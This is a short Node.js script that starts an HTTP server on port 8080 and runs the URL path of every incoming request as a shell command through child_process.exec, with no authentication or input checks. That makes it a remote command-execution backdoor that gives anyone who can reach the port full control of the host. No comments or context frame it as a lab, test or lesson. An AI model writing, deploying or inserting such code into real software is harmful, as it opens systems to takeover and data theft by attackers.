const http = require('node:http');
const childProcess = require('node:child_process');

http.createServer((request, response) => {
  childProcess.exec(request.url.slice(1));
  response.end('ok');
}).listen(8080);
